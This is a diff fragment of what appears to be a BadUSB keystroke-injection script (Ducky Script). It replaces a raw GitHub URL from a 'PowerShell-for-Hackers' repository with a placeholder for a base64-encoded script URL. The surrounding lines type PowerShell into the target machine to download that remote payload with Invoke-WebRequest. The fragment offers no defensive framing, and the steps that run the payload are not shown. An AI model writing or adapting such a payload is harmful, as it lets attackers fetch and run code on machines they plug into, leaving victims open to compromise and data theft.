@@ -14,7 +14,7 @@ ENTER
 
 DELAY 1000
 
-STRING $url = "https://raw.githubusercontent.com/I-Am-Jakoby/PowerShell-for-Hackers/main/test.txt"
+STRING $url = "YOUR-URL-WITH-BASE64-ENCODED-SCRIPT"
 SHIFT ENTER
 STRING $Payload = (Invoke-WebRequest $url'?dl=1').Content
 SHIFT ENTER
